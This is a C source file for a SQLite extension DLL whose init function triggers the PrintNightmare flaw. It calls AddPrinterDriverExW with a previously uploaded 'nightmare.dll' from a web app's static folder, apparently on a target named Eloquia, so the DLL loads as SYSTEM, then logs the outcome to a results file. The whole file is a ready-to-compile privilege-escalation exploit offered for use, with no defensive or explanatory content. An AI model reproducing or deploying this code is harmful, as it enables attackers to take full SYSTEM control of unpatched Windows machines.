#include <windows.h>
#include <stdio.h>

// PrintNightmare trigger via SQLite load_extension
// Calls AddPrinterDriverEx to load our malicious driver DLL as SYSTEM

typedef BOOL (WINAPI *AddPrinterDriverExW_t)(
    LPWSTR pName,
    DWORD Level,
    LPBYTE pDriverInfo,
    DWORD dwFileCopyFlags
);

typedef struct _DRIVER_INFO_2W {
    DWORD cVersion;
    LPWSTR pName;
    LPWSTR pEnvironment;
    LPWSTR pDriverPath;
    LPWSTR pDataFile;
    LPWSTR pConfigFile;
} DRIVER_INFO_2W;

#define APD_COPY_ALL_FILES 0x00000004
#define APD_COPY_FROM_DIRECTORY 0x00000010

__declspec(dllexport) int sqlite3_extension_init(void *db, char **errmsg, void *api) {
    HMODULE hWinspool = LoadLibraryW(L"winspool.drv");
    if (!hWinspool) return 1;

    AddPrinterDriverExW_t pAddPrinterDriverExW =
        (AddPrinterDriverExW_t)GetProcAddress(hWinspool, "AddPrinterDriverExW");
    if (!pAddPrinterDriverExW) return 1;

    // Path to our malicious DLL (already uploaded)
    wchar_t dllPath[] = L"C:\\Web\\Eloquia\\static\\nightmare.dll";

    DRIVER_INFO_2W di;
    ZeroMemory(&di, sizeof(di));
    di.cVersion = 3;
    di.pName = L"EvilDriver";
    di.pEnvironment = L"Windows x64";
    di.pDriverPath = dllPath;
    di.pDataFile = dllPath;
    di.pConfigFile = dllPath;

    // Trigger PrintNightmare - this loads our DLL as SYSTEM!
    BOOL result = pAddPrinterDriverExW(
        NULL,
        2,
        (LPBYTE)&di,
        APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY
    );

    // Write result to file for debugging
    FILE *f = fopen("C:\\Web\\Eloquia\\static\\nightmare_result.txt", "w");
    if (f) {
        if (result) {
            fprintf(f, "SUCCESS: PrintNightmare triggered!\n");
        } else {
            fprintf(f, "FAILED: Error code %lu\n", GetLastError());
        }
        fclose(f);
    }

    FreeLibrary(hWinspool);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    return TRUE;
}
